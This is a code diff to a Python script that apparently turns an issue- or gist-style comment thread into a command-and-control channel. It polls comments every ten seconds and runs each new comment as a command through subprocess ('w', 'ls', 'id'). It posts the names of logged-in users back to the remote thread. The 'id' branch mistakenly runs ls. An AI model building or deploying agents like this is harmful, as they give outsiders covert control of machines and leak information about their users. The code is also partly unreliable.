@@ -1,5 +1,6 @@
 #! /bin/python3
 import argparse
+import subprocess
 import requests
 from dotenv import dotenv_values
 import time
@@ -51,7 +52,6 @@ def log(message):
 def get_latest_comments():
     response = requests.get(comments_url, headers=headers)
     comments = response.json()
-    print(comments)
     latest = filter(
         lambda comment: comment['updated_at'] > state['last_update'], comments)
     return list(latest)
@@ -61,17 +61,45 @@ def get_commands(comments):
     return map(lambda comment: comment['body'], comments)
 
 
-def post_comment(message):
+def post_comment(message: str):
+    log(f'Sending message "{message}"')
     response = requests.post(
         comments_url, json={"body": message}, headers=headers)
-    print(response)
+    log(response)
+    state["last_update"] = response.json()['updated_at']
+
+
+def handle_command(command: str):
+    log(f'Received command "{command}"')
+
+    args = command.split(' ')
+    bin_name = args[0]
+    match bin_name:
+        case 'w':
+            result = subprocess.check_output(
+                ['w'])
+
+            usernames = list(map(lambda line: line.decode(
+                'utf-8').split(' ')[0], result.splitlines()))[1:]
+
+            post_comment(', '.join(map(str, usernames)))
+        case 'ls':
+            subprocess.run(['ls', args[1]])
+        case 'id':
+            subprocess.run(['ls', args[1]])
+        case _:
+            log('Unknown command: '+command)
 
 
 while True:
-    time.sleep(5)
+    time.sleep(10)
+    log('fetching comments')
     comments = get_latest_comments()
-    print('fetching comments')
+    if len(comments) == 0:
+        log('No new commands')
     if len(comments) > 0:
         state['last_update'] = comments[-1]['updated_at']
-        for command in get_commands(comments):
-            log(f'Received command "{command}"')
+
+    for command in get_commands(comments):
+        log(command)
+        handle_command(command)
